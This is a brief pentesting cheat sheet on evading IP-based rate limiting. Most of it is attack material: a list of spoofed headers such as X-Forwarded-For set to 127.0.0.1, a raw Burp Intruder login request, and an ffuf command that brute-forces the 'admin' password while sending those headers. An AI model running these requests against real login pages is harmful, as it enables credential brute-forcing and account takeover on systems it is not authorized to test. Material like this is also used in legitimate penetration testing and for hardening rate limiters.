
# Bypass rate limit by adding headers

In some cases, rate-limiting mechanisms rely on IP addresses to track requests.  
You can attempt to bypass this by adding spoofed IP-related headers.

## Common headers used for bypass:
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Origination-IP: 127.0.0.1
X-Origination-IP: 0.0.0.0
X-Fowarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

---

## Example using Burp Intruder:
```
POST /login.php HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Origination-IP: 127.0.0.1
X-Fowarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1

username=admin&password=$test$
```

---

##  Example using ffuf:
```bash
ffuf -u https://example.com -w /path/to/wordlist.txt \
--data "username=admin&password=FUZZ" \
-H "X-Forwarded-For: 127.0.0.1" \
-H "X-Forwarded-Host: 127.0.0.1"
```

---

🔎 **Note:** Always check server behavior (status codes, responses) to see if the rate limit was bypassed.
